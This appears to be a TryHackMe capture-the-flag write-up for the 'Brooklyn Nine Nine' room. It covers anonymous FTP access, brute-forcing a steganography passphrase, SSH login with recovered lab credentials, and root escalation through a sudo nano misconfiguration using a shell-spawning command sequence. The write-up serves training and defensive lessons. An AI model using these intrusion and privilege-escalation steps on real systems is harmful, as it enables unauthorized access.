# 🛡️ CTF Writeup — Brooklyn Nine Nine

## 📌 Overview

* **Platform:** TryHackMe
* **Difficulty:** Easy
* **Objective:** User flag + Root flag (Full compromise)

Brooklyn Nine Nine is a beginner-friendly room themed around the TV show of the same name. The attack path combines anonymous FTP access, steganography, and a `sudo` misconfiguration to achieve full root compromise. The room explicitly notes two intended paths to root — this writeup covers the `nano` privilege escalation route.

---

## 🔍 Enumeration

### 1. Initial Reconnaissance

A full-service scan was performed using RustScan to identify open ports, followed by Nmap's aggressive mode for version and script detection.

```bash
rustscan -a 10.66.165.191 -- -A
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21   | Open  | FTP     | vsftpd 3.0.3 |
| 22   | Open  | SSH     | OpenSSH |
| 80   | Open  | HTTP    | Apache |

Key observation from the Nmap output: **anonymous FTP login was permitted**, and a file named `note_to_jake.txt` was visible in the FTP root directory — an immediate priority for investigation.
ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

---

### 2. Further Enumeration

#### FTP — Anonymous Access

The FTP service was accessed anonymously to retrieve the exposed file:

```bash
ftp 10.66.165.191 21
# Login: Anonymous / (blank password)

ftp> get note_to_jake.txt
```

```bash
cat note_to_jake.txt
```
From Amy,
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

This note revealed three valid usernames — **jake**, **amy**, and **holt** — and indicated that Jake's credentials were weak, suggesting a brute-force opportunity. The FTP service itself was confirmed to be anonymous-only, ruling it out as a brute-force target for Jake.

#### HTTP — Directory Enumeration & Source Review

Directory brute-forcing was performed against the web server:

```bash
ffuf -u http://10.66.165.191/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

No exploitable directories were identified. However, a comment in the HTML source of the index page revealed a critical hint:

```html
<!-- Have you ever heard of steganography? -->
```

This directed attention to `brooklyn99.jpg`, the main image served on the page.

#### Steganography Analysis — `brooklyn99.jpg`

Metadata and embedded data analysis was performed on the image:

```bash
exiftool brooklyn99.jpg     # No notable metadata
binwalk brooklyn99.jpg      # No embedded files detected
steghide info brooklyn99.jpg  # Confirmed steganographic capacity of ~3.5 KB
```

`steghide` confirmed hidden data was present but passphrase-protected. Manual guessing attempts (thematic terms from the show) yielded no results. Automated brute-forcing with `stegseek` and the `rockyou.txt` wordlist was then used:

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```
[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

```bash
cat brooklyn99.jpg.out
```
Holts Password:
fluffydog12@ninenine
Enjoy!!

---

## 💥 Exploitation

**Type:** Credential Disclosure via Steganography  
**Location:** `brooklyn99.jpg` hosted on the HTTP service  
**Impact:** Valid SSH credentials obtained for user `holt`

The credentials extracted from the steganographic payload were used to authenticate via SSH:

```bash
ssh holt@10.66.165.191
# Password: fluffydog12@ninenine
```

Access was successfully established as user `holt`. The user flag was retrieved immediately:

```bash
cat ~/user.txt
# <user_flag>
```

---

## 🔓 Privilege Escalation

### Local Enumeration

Post-authentication, `sudo` privileges were checked without requiring any additional tools:

```bash
sudo -l
```
User holt may run the following commands on brookly_nine_nine:
(ALL) NOPASSWD: /bin/nano

### Identified Vector

**Misconfiguration:** `holt` was permitted to execute `/bin/nano` as `root` without a password. This is a classic `sudo` misconfiguration exploitable via GTFOBins.

### Escalation via `nano`

Since `nano` was launched with root privileges, its built-in command execution feature was leveraged to spawn a root shell:

```bash
export TERM=xterm   # Required to resolve terminal compatibility error
sudo nano
```

Inside `nano`:
CTRL+R  →  CTRL+X  →  Command to execute: reset; sh 1>&0 2>&0

This command:
- `reset` — restores a clean terminal state
- `sh` — spawns a POSIX shell
- `1>&0 2>&0` — redirects stdout and stderr to the terminal, enabling an interactive session

Since `nano` was running as root, the resulting shell inherited root privileges. This was confirmed with:

```bash
whoami
# root
```

The root flag was then retrieved:

```bash
cat /root/root.txt
# <root_flag>
```

---
## Attack Flow

```mermaid
flowchart TD
    A[Start Recon on target] --> B[Run RustScan and Nmap]
    B --> B1[Find ports 21 FTP 22 SSH 80 HTTP]
    B1 --> C[Notice anonymous FTP login allowed]
    C --> C1[Download note_to_jake.txt from FTP]
    C1 --> C2[Extract usernames and weak password hint]

    C2 --> D[Enumerate web content with ffuf]
    D --> D1[No major directories found]
    D1 --> E[Inspect index source code]
    E --> E1[Find steganography hint in HTML comment]
    E1 --> F[Analyze brooklyn99.jpg]

    F --> F1[Check with exiftool and binwalk]
    F1 --> F2[Use steghide info to confirm hidden data]
    F2 --> G[Bruteforce passphrase with stegseek and rockyou]
    G --> G1[Extract note.txt from image]
    G1 --> G2[Recover SSH credentials for holt]

    G2 --> H[SSH login as holt]
    H --> H1[Read user flag]
    H1 --> I[Run sudo -l]
    I --> I1[Find NOPASSWD sudo on /bin/nano]

    I1 --> J[Launch sudo nano]
    J --> J1[Use nano command execution sequence]
    J1 --> J2[Spawn interactive root shell]
    J2 --> K[Confirm root with whoami]
    K --> L[Read root flag]
```



## 🧠 Lessons Learned

- **Anonymous FTP is a significant information disclosure risk.** Even without writable access, files left in an FTP root can leak usernames, internal notes, and credentials. In a real engagement, this would be flagged as a high-severity finding.

- **HTML source code should always be reviewed manually.** Automated scanners would not have extracted the steganography hint. Careful manual inspection of HTTP responses complements directory brute-forcing.

- **Common passphrases defeat steganographic secrecy.** The passphrase `admin` was cracked via `rockyou.txt` in seconds. If steganography is used to protect sensitive data, the passphrase must be treated with the same rigor as the data itself.

- **`sudo` text editors are full privesc vectors.** Any editor (nano, vim, less, more) granted via `sudo` can be used to execute arbitrary commands as root. The GTFOBins project documents this exhaustively. Defenders should audit `sudoers` files rigorously and avoid granting editor access.

- **Enumeration order matters.** The SSH brute-force path for `jake` was not needed here because the steganography path revealed `holt`'s credentials directly. Recognizing when to pivot — rather than exhausting one avenue — saves significant time.

---

## 🧩 Tools Used

* **RustScan** — Fast port discovery
* **Nmap** — Service/version detection and script scanning
* **FTP client** — Anonymous FTP access and file retrieval
* **ffuf** — HTTP directory enumeration
* **exiftool** — Image metadata analysis
* **binwalk** — Binary analysis and embedded file detection
* **steghide** — Steganographic data extraction
* **stegseek** — Steganography passphrase brute-forcing
* **GTFOBins** (technique) — `sudo nano` privilege escalation

---

## ⚠️ Notes

* Flags are intentionally omitted from this public version of the writeup
* This writeup covers one of two intended root paths (the `nano` sudo misconfiguration route)
* All activity was performed in an isolated TryHackMe lab environment
